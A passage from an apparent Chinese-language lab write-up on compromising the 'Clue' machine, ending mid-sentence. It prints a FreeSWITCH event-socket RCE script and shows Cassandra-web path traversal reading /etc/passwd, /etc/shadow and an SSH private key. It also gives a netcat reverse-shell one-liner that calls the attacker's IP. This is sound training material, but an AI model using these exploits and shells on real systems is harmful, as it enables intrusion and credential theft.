445/tcp  open  netbios-ssn      syn-ack ttl 61 Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
3000/tcp open  http             syn-ack ttl 61 Thin httpd
|_http-title: Cassandra Web
|_http-server-header: thin
|_http-favicon: Unknown favicon MD5: 68089FD7828CD453456756FE6E7C4FD8
| http-methods: 
|_  Supported Methods: GET HEAD
8021/tcp open  freeswitch-event syn-ack ttl 61 FreeSWITCH mod_event_socket
&lt;/pre&gt;
&lt;/div&gt;
&lt;h2 id=&#34;enumeration&#34;&gt;Enumeration
&lt;/h2&gt;&lt;p&gt;两个HTTP服务端口，先看80：&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;729&#34; height=&#34;356&#34; src=&#34;../legacy/uploads/2025/04/1745587019-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1342&#34; srcset=&#34;../legacy/uploads/2025/04/1745587019-image.png 729w, ../legacy/uploads/2025/04/1745587019-image-300x147.png 300w&#34; sizes=&#34;auto, (max-width: 729px) 100vw, 729px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;直接就是无权访问，用ffuf尝试遍历：&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: plain; title: ; notranslate&#34; title=&#34;&#34;&gt;
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://192.168.170.240/FUZZ -fw 770 
&lt;p&gt;backup                  [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 193ms]
&lt;/pre&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;找到一个文件夹backup，访问一下也是403 forbidden。端口3000下好像是一个数据库的页面服务：&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;570&#34; src=&#34;../legacy/uploads/2025/04/1745587152-image-1024x570.png&#34; alt=&#34;&#34; class=&#34;wp-image-1344&#34; srcset=&#34;../legacy/uploads/2025/04/1745587152-image-1024x570.png 1024w, ../legacy/uploads/2025/04/1745587152-image-300x167.png 300w, ../legacy/uploads/2025/04/1745587152-image-768x428.png 768w, ../legacy/uploads/2025/04/1745587152-image-1536x855.png 1536w, ../legacy/uploads/2025/04/1745587152-image.png 1871w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;谷歌搜了一下发现了这个文章 &lt;a href=&#34;https://jfrog.com/blog/cve-2021-44521-exploiting-apache-cassandra-user-defined-functions-for-remote-code-execution/&#34; target=&#34;_blank&#34;  rel=&#34;nofollow&#34; &gt;CVE-2021-44521&lt;/a&gt;, 以及一个github的&lt;a href=&#34;https://github.com/WoodenKlaas/CVE-2021-44521&#34; target=&#34;_blank&#34;  rel=&#34;nofollow&#34; &gt;POC&lt;/a&gt;. 手动尝试文章描述的方法，但会提示用户无权限. &lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;581&#34; src=&#34;../legacy/uploads/2025/04/1745587418-image-1024x581.png&#34; alt=&#34;&#34; class=&#34;wp-image-1347&#34; srcset=&#34;../legacy/uploads/2025/04/1745587418-image-1024x581.png 1024w, ../legacy/uploads/2025/04/1745587418-image-300x170.png 300w, ../legacy/uploads/2025/04/1745587418-image-768x436.png 768w, ../legacy/uploads/2025/04/1745587418-image.png 1168w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;（这里截不到显示的信息，总之就是登录的用户cassie无权限&lt;/p&gt;
&lt;p&gt;靶机还开放了SMB服务，用enum4linux扫描一下：&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
 enum4linux 192.168.x.240
...
Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        backup          Disk      Backup web directory shares
        IPC$            IPC       IPC Service (Samba 4.9.5-Debian)
....
&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;smb服务允许匿名登录，并发现了一个share &lt;strong&gt;backup&lt;/strong&gt;. 登录并查看：&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
smbclient //192.168.170.240/backup
Password for &amp;#x5B;WORKGROUP\kali]:
Try &#34;help&#34; to get a list of possible commands.
smb: \&amp;gt; ls
  .                                   D        0  Fri Aug  5 18:43:50 2022
  ..                                  D        0  Fri Aug  5 18:43:44 2022
  freeswitch                          D        0  Fri Aug  5 18:43:51 2022
  cassandra                           D        0  Sat May  7 01:04:47 2022
&lt;p&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;发现了两个文件夹，下载下来查看:&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
smb: \&amp;gt; recurse ON
smb: \&amp;gt; prompt OFF
smb: \&amp;gt; mget *
......
&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;手动看了一下，应该是安装的两个软件的备份文件？因为3000端口上运行着cassandra， 8021端口上运行着freeswitch. 在下载下来的文件里发现了freeswitch版本为1.2.7：&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;947&#34; height=&#34;609&#34; src=&#34;../legacy/uploads/2025/04/1745588029-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1352&#34; srcset=&#34;../legacy/uploads/2025/04/1745588029-image.png 947w, ../legacy/uploads/2025/04/1745588029-image-300x193.png 300w, ../legacy/uploads/2025/04/1745588029-image-768x494.png 768w&#34; sizes=&#34;auto, (max-width: 947px) 100vw, 947px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;initial-foothold&#34;&gt;Initial Foothold
&lt;/h2&gt;&lt;p&gt;用searchsploit搜一下看有没有对应的exploit:&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;842&#34; height=&#34;238&#34; src=&#34;../legacy/uploads/2025/04/1745588083-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1355&#34; srcset=&#34;../legacy/uploads/2025/04/1745588083-image.png 842w, ../legacy/uploads/2025/04/1745588083-image-300x85.png 300w, ../legacy/uploads/2025/04/1745588083-image-768x217.png 768w&#34; sizes=&#34;auto, (max-width: 842px) 100vw, 842px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;找到了一个1.10.1版本的RCE，复制下来并查看：&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: python; title: ; notranslate&#34; title=&#34;&#34;&gt;
#!/usr/bin/python3
&lt;p&gt;from socket import *
import sys&lt;/p&gt;
&lt;p&gt;if len(sys.argv) != 3:
print(&#39;Missing arguments&#39;)
print(&#39;Usage: freeswitch-exploit.py &amp;lt;target&amp;gt; &amp;lt;cmd&amp;gt;&#39;)
sys.exit(1)&lt;/p&gt;
&lt;p&gt;ADDRESS=sys.argv[1]
CMD=sys.argv[2]
PASSWORD=&#39;ClueCon&#39; # default password for FreeSWITCH&lt;/p&gt;
&lt;p&gt;s=socket(AF_INET, SOCK_STREAM)
s.connect((ADDRESS, 8021))&lt;/p&gt;
&lt;p&gt;response = s.recv(1024)
if b&#39;auth/request&#39; in response:
s.send(bytes(f&#39;auth {PASSWORD}\n\n&#39;, &#39;utf8&#39;))
response = s.recv(1024)
print(response)
if b&#39;+OK accepted&#39; in response:
print(&#39;Authenticated&#39;)
s.send(bytes(&#39;api system {}\n\n&#39;.format(CMD), &#39;utf8&#39;))
response = s.recv(8096).decode()
print(response)
else:
print(&#39;Authentication failed&#39;)
sys.exit(1)
else:
print(&#39;Not prompted for authentication, likely not vulnerable&#39;)
sys.exit(1)
&lt;/pre&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;这个script用默认密码ClueCon来验证后，再尝试执行命令。直接运行一下试试：&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
python3 47799.py 192.168.170.240 &amp;#039;whoami&amp;#039;
b&amp;#039;Content-Type: command/reply\nReply-Text: -ERR invalid\n\n&amp;#039;
Authentication failed
&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;显示验证失败，应该是密码被改了。看下cassandra有没有exploit:&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;847&#34; height=&#34;181&#34; src=&#34;../legacy/uploads/2025/04/1745588291-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1359&#34; srcset=&#34;../legacy/uploads/2025/04/1745588291-image.png 847w, ../legacy/uploads/2025/04/1745588291-image-300x64.png 300w, ../legacy/uploads/2025/04/1745588291-image-768x164.png 768w&#34; sizes=&#34;auto, (max-width: 847px) 100vw, 847px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;有一个Remote File Read的exploit，复制下来试一下：&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
python3 49362.py -p 3000 192.168.170.240 &amp;#039;/etc/passwd&amp;#039;
&lt;p&gt;root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ntp:x:106:113::/nonexistent:/usr/sbin/nologin
cassandra:x:107:114:Cassandra database,,,:/var/lib/cassandra:/usr/sbin/nologin
cassie:x:1000:1000::/home/cassie:/bin/bash
freeswitch:x:998:998:FreeSWITCH:/var/lib/freeswitch:/bin/false
anthony:x:1001:1001::/home/anthony:/bin/bash
&lt;/pre&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;能用，发现了用户cassie和anthony. 另外，这个exploit里有提示:&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: plain; title: ; notranslate&#34; title=&#34;&#34;&gt;
cat 49362.py 
.....
# Usage
# &amp;gt; cassmoney.py 10.0.0.5 /etc/passwd
# root:x:0:0:root:/root:/bin/bash
# daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
# bin:x:2:2:bin:/bin:/usr/sbin/nologin
#
# &amp;gt; cassmoney.py 10.0.0.5 /proc/self/cmdline
# /usr/bin/ruby2.7/usr/local/bin/cassandra-web--usernameadmin--passwordP@ssw0rd
#
# (these creds are for auth to the running apache cassandra database server)
....
&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;可以用第二条指令来dump 运行cassandra-web时的用户名和密码，尝试:&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: plain; title: ; notranslate&#34; title=&#34;&#34;&gt;
python3 49362.py -p 3000 192.168.170.240 &amp;#039;/proc/self/cmdline&amp;#039;
&lt;p&gt;/usr/bin/ruby2.5/usr/local/bin/cassandra-web-ucassie-pSecondBiteTheApple330
&lt;/pre&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;获得了cassie的密码&lt;strong&gt;SecondBiteTheApple330&lt;/strong&gt;. SSH/22端口开启，尝试以cassie登录:&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: plain; title: ; notranslate&#34; title=&#34;&#34;&gt;
ssh cassie@192.168.170.240
cassie@192.168.170.240&amp;#039;s password: 
Permission denied, please try again.
&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;失败，可能是不允许cassie ssh登录？尝试用这个密码以Anthony登录看看有没有密码复用，但也失败。&lt;/p&gt;
&lt;p&gt;在下载下来的freeswitch目录下运行grep查找密码：&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
freeswitch grep -r password
etc/freeswitch/autoload_configs/event_socket.conf.xml:    &amp;lt;param name=&#34;password&#34; value=&#34;ClueCon&#34;/&amp;gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;发现了这个文件 &lt;strong&gt;event_socket.conf.xml&lt;/strong&gt; 结合上面freeswitch的exploit, &lt;strong&gt;ClueCon&lt;/strong&gt;是这个软件的默认密码，密码应该就保存在这个文件里。我们又可以用另一个cassandra的exploit任意读取文件，那么应该就可以获取正在运行的freeswitch的密码：&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: plain; title: ; notranslate&#34; title=&#34;&#34;&gt;
python3 49362.py -p 3000 192.168.170.240 &amp;#039;/etc/freeswitch/autoload_configs/event_socket.conf.xml&amp;#039;
&lt;p&gt;&amp;lt;configuration name=&amp;ldquo;event_socket.conf&amp;rdquo; description=&amp;ldquo;Socket Client&amp;rdquo;&amp;gt;
&amp;lt;settings&amp;gt;
&amp;lt;param name=&amp;ldquo;nat-map&amp;rdquo; value=&amp;ldquo;false&amp;rdquo;/&amp;gt;
&amp;lt;param name=&amp;ldquo;listen-ip&amp;rdquo; value=&amp;ldquo;0.0.0.0&amp;rdquo;/&amp;gt;
&amp;lt;param name=&amp;ldquo;listen-port&amp;rdquo; value=&amp;ldquo;8021&amp;rdquo;/&amp;gt;
&amp;lt;param name=&amp;ldquo;password&amp;rdquo; value=&amp;ldquo;StrongClueConEight021&amp;rdquo;/&amp;gt;
&amp;lt;/settings&amp;gt;
&amp;lt;/configuration&amp;gt;
&lt;/pre&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;成功获得现在的密码，修改exploit里的密码为StrongClueConEight021并运行：&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;859&#34; height=&#34;214&#34; src=&#34;../legacy/uploads/2025/04/1745589040-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1364&#34; srcset=&#34;../legacy/uploads/2025/04/1745589040-image.png 859w, ../legacy/uploads/2025/04/1745589040-image-300x75.png 300w, ../legacy/uploads/2025/04/1745589040-image-768x191.png 768w&#34; sizes=&#34;auto, (max-width: 859px) 100vw, 859px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;成功获得RCE，使用&lt;a href=&#34;https://www.revshells.com/&#34; target=&#34;_blank&#34;  rel=&#34;nofollow&#34; &gt;&lt;a class=&#34;link&#34; href=&#34;https://www.revshells.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.revshells.com/&lt;/a&gt;&lt;/a&gt; 生成一个reverse shell，打开监听尝试:&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
python3 47799.py 192.168.170.240 &amp;#039;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&amp;gt;&amp;1|nc 192.168.45.238 8021 &amp;gt;/tmp/f&amp;#039;
&lt;p&gt;nc -nlvp 8021
listening on [any] 8021 &amp;hellip;
connect to [192.168.45.238] from (UNKNOWN) [192.168.170.240] 41968
sh: 0: can&#39;t access tty; job control turned off
$ id
uid=998(freeswitch) gid=998(freeswitch) groups=998(freeswitch)
$
&lt;/pre&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;成功获得shell，可以用之前获得的cassie的密码 su到cassie&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
su cassie
Password: SecondBiteTheApple330
id
uid=1000(cassie) gid=1000(cassie) groups=1000(cassie)
&lt;/pre&gt;
&lt;/div&gt;
&lt;h2 id=&#34;root&#34;&gt;Root
&lt;/h2&gt;&lt;p&gt;先用python升级一下shell, 又发现cassie可以以sudo运行/usr/local/bin/cassandra-web, 运行一下看看：&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
python -c &amp;#039;import pty; pty.spawn(&#34;/bin/bash&#34;)&amp;#039;
cassie@clue:/$ sudo -l
sudo -l
Matching Defaults entries for cassie on clue:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
&lt;p&gt;User cassie may run the following commands on clue:
(ALL) NOPASSWD: /usr/local/bin/cassandra-web&lt;/p&gt;
&lt;p&gt;cassie@clue:/$ sudo /usr/local/bin/cassandra-web
sudo /usr/local/bin/cassandra-web
I, [2025-04-25T09:54:22.528305 #1828]  INFO &amp;ndash; : Establishing control connection
W, [2025-04-25T09:54:22.530872 #1828]  WARN &amp;ndash; : Host 127.0.0.1 refused all connections
Cassandra::Errors::AuthenticationError: Server requested authentication, but client was not configured to authenticate&lt;/p&gt;
&lt;p&gt;Usage: cassandra-web [options]
-B, &amp;ndash;bind BIND                  ip:port or path for cassandra web to bind on (default: 0.0.0.0:3000)
-H, &amp;ndash;hosts HOSTS                coma-separated list of cassandra hosts (default: 127.0.0.1)
-P, &amp;ndash;port PORT                  integer port that cassandra is running on (default: 9042)
-L, &amp;ndash;log-level LEVEL            log level (default: info)
-u, &amp;ndash;username USER              username to use when connecting to cassandra
-p, &amp;ndash;password PASS              password to use when connecting to cassandra
-C, &amp;ndash;compression NAME           compression algorithm to use (lz4 or snappy)
&amp;ndash;server-cert PATH           server ceritificate pathname
&amp;ndash;client-cert PATH           client ceritificate pathname
&amp;ndash;private-key PATH           path to private key
&amp;ndash;passphrase SECRET          passphrase for the private key
-h, &amp;ndash;help                       Show help
&lt;/pre&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;看起来可以再运行一个cassandra的服务，并且这个服务是以sudo权限运行的，所以我们应该可以利用这个root权限的服务和之前使用的cassandra的exploit读取任意文件。以sudo开启cassandra服务，并绑定到1234端口：&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: plain; title: ; notranslate&#34; title=&#34;&#34;&gt;
cassie@clue:/$ sudo /usr/local/bin/cassandra-web -B 0.0.0.0:1234 -u cassie -p SecondBiteTheApple330
&amp;lt; -B 0.0.0.0:1234 -u cassie -p SecondBiteTheApple330
I, &amp;#x5B;2025-04-25T09:56:21.312344 #1851]  INFO -- : Establishing control connection
I, &amp;#x5B;2025-04-25T09:56:21.389259 #1851]  INFO -- : Refreshing connected host&amp;#039;s metadata
I, &amp;#x5B;2025-04-25T09:56:21.394232 #1851]  INFO -- : Completed refreshing connected host&amp;#039;s metadata
I, &amp;#x5B;2025-04-25T09:56:21.394883 #1851]  INFO -- : Refreshing peers metadata
I, &amp;#x5B;2025-04-25T09:56:21.395813 #1851]  INFO -- : Completed refreshing peers metadata
I, &amp;#x5B;2025-04-25T09:56:21.395838 #1851]  INFO -- : Refreshing schema
I, &amp;#x5B;2025-04-25T09:56:21.423071 #1851]  INFO -- : Schema refreshed
I, &amp;#x5B;2025-04-25T09:56:21.423098 #1851]  INFO -- : Control connection established
I, &amp;#x5B;2025-04-25T09:56:21.423251 #1851]  INFO -- : Creating session
I, &amp;#x5B;2025-04-25T09:56:21.563511 #1851]  INFO -- : Session created
2025-04-25 09:56:21 -0400 Thin web server (v1.8.1 codename Infinite Smoothie)
2025-04-25 09:56:21 -0400 Maximum connections set to 1024
2025-04-25 09:56:21 -0400 Listening on 0.0.0.0:1234, CTRL+C to stop
&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;这里我尝试对端口1234再用49362.py读取文件时，一直卡住，用nmap扫了一下显示端口1234关闭，可能是防火墙拦截了？也许只能从本地访问。看一下49362.py里是如何请求的:&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: plain; title: ; notranslate&#34; title=&#34;&#34;&gt;
DT = &amp;#039;../&amp;#039;
DT_NUM = 8
......
                payload = urllib.parse.quote_plus(DT * self.number + self.file)
&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;payload就是http://IP:PORT/加上DT_NUM个 &amp;quot; &lt;strong&gt;../&lt;/strong&gt; &amp;ldquo;. 那么我们可以手动在本地请求，用47799再生成一个reverse shell后，请求新开启的cassandra服务:&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
cassie@clue:/$ curl --path-as-is 127.0.0.1:1234/../../../../../../../../etc/shadow
&amp;lt;s 127.0.0.1:1234/../../../../../../../../etc/shadow
root:$6$kuXiAC8PIOY2uis9$LrTzlkYSlY485ZREBLW5iPSpNxamM38BL85BPmaIAWp05VlV.tdq0EryiFLbLryvbsGTx50dLnMsxIk7PJB5P1:19209:0:99999:7:::
daemon:*:18555:0:99999:7:::
bin:*:18555:0:99999:7:::
sys:*:18555:0:99999:7:::
sync:*:18555:0:99999:7:::
games:*:18555:0:99999:7:::
man:*:18555:0:99999:7:::
lp:*:18555:0:99999:7:::
mail:*:18555:0:99999:7:::
news:*:18555:0:99999:7:::
uucp:*:18555:0:99999:7:::
proxy:*:18555:0:99999:7:::
www-data:*:18555:0:99999:7:::
backup:*:18555:0:99999:7:::
list:*:18555:0:99999:7:::
irc:*:18555:0:99999:7:::
gnats:*:18555:0:99999:7:::
nobody:*:18555:0:99999:7:::
_apt:*:18555:0:99999:7:::
systemd-timesync:*:18555:0:99999:7:::
systemd-network:*:18555:0:99999:7:::
systemd-resolve:*:18555:0:99999:7:::
messagebus:*:18555:0:99999:7:::
sshd:*:18555:0:99999:7:::
systemd-coredump:!!:18555::::::
ntp:*:19209:0:99999:7:::
cassandra:!:19209:0:99999:7:::
cassie:$6$/WeFDwP1CNIN34/z$9woKSLSZhgHw1mX3ou90wnR.i5LHEfeyfHbxu7nYmaZILVrbhHrSeHNGqV0WesuQWGIL7DHEwHKOLK6UX79DI0:19209:0:99999:7:::
freeswitch:!:19209::::::
anthony:$6$01NV0gAhVLOnUHb0$byLv3N95fqVvhut9rbsrYOVzi8QseWfkFl7.VDQ.26a.0IkEVR2TDXoTv/KCMLjUOQZMMpkTUdC3WIyqSWQ.Y1:19209:0:99999:7:::
&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;（注意这里要加上&amp;ndash;path-as-is, 不然curl会把多个../给省略掉）&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;成功读取shadow文件. 可以下anthony home下读取anthony的id_rsa&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
cassie@clue:/$ curl --path-as-is 127.0.0.1:1234/../../../../../../../../home/anthony/.ssh/id_rsa
&amp;lt;34/../../../../../../../../home/anthony/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAw59iC+ySJ9F/xWp8QVkvBva2nCFikZ0VT7hkhtAxujRRqKjhLKJe
d19FBjwkeSg+PevKIzrBVr0JQuEPJ1C9NCxRsp91xECMK3hGh/DBdfh1FrQACtS4oOdzdM
jWyB00P1JPdEM4ojwzPu0CcduuV0kVJDndtsDqAcLJr+Ls8zYo376zCyJuCCBonPVitr2m
B6KWILv/ajKwbgrNMZpQb8prHL3lRIVabjaSv0bITx1KMeyaya+K+Dz84Vu8uHNFJO0rhq
gBAGtUgBJNJWa9EZtwws9PtsLIOzyZYrQTOTq4+q/FFpAKfbsNdqUe445FkvPmryyx7If/
DaMoSYSPhwAAA8gc9JxpHPScaQAAAAdzc2gtcnNhAAABAQDDn2IL7JIn0X/FanxBWS8G9r
acIWKRnRVPuGSG0DG6NFGoqOEsol53X0UGPCR5KD4968ojOsFWvQlC4Q8nUL00LFGyn3XE
QIwreEaH8MF1+HUWtAAK1Lig53N0yNbIHTQ/Uk90QziiPDM+7QJx265XSRUkOd22wOoBws
mv4uzzNijfvrMLIm4IIGic9WK2vaYHopYgu/9qMrBuCs0xmlBvymscveVEhVpuNpK/RshP
HUox7JrJr4r4PPzhW7y4c0Uk7SuGqAEAa1SAEk0lZr0Rm3DCz0+2wsg7PJlitBM5Orj6r8
UWkAp9uw12pR7jjkWS8+avLLHsh/8NoyhJhI+HAAAAAwEAAQAAAQBjswJsY1il9I7zFW9Y
etSN7wVok1dCMVXgOHD7iHYfmXSYyeFhNyuAGUz7fYF1Qj5enqJ5zAMnataigEOR3QNg6M
mGiOCjceY+bWE8/UYMEuHR/VEcNAgY8X0VYxqcCM5NC201KuFdReM0SeT6FGVJVRTyTo+i
CbX5ycWy36u109ncxnDrxJvvb7xROxQ/dCrusF2uVuejUtI4uX1eeqZy3Rb3GPVI4Ttq0+
0hu6jNH4YCYU3SGdwTDz/UJIh9/10OJYsuKcDPBlYwT7mw2QmES3IACPpW8KZAigSLM4fG
Y2Ej3uwX8g6pku6P6ecgwmE2jYPP4c/TMU7TLuSAT9TpAAAAgG46HP7WIX+Hjdjuxa2/2C
gX/VSpkzFcdARj51oG4bgXW33pkoXWHvt/iIz8ahHqZB4dniCjHVzjm2hiXwbUvvnKMrCG
krIAfZcUP7Ng/pb1wmqz14lNwuhj9WUhoVJFgYk14knZhC2v2dPdZ8BZ3dqBnfQl0IfR9b
yyQzy+CLBRAAAAgQD7g2V+1vlb8MEyIhQJsSxPGA8Ge05HJDKmaiwC2o+L3Er1dlktm/Ys
kBW5hWiVwWoeCUAmUcNgFHMFs5nIZnWBwUhgukrdGu3xXpipp9uyeYuuE0/jGob5SFHXvU
DEaXqE8Q9K14vb9by1RZaxWEMK6byndDNswtz9AeEwnCG0OwAAAIEAxxy/IMPfT3PUoknN
Q2N8D2WlFEYh0avw/VlqUiGTJE8K6lbzu6M0nxv+OI0i1BVR1zrd28BYphDOsAy6kZNBTU
iw4liAQFFhimnpld+7/8EBW1Oti8ZH5Mx8RdsxYtzBlC2uDyblKrG030Nk0EHNpcG6kRVj
4oGMJpv1aeQnWSUAAAAMYW50aG9ueUBjbHVlAQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----
&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;保存到本地，并尝试用anthony登录:&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
ssh -i id_rsa anthony@192.168.170.240                           
anthony@192.168.170.240&amp;#039;s password: 
Permission denied, please try again.
anthony@192.168.170.240&amp;#039;s password: 
Permission denied, please try again.
anthony@192.168.170.240&amp;#039;s password: 
anthony@192.168.170.240: Permission denied (publickey,password).
&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;但却仍然提示要密码，奇怪了。尝试用root登录:&lt;/p&gt;
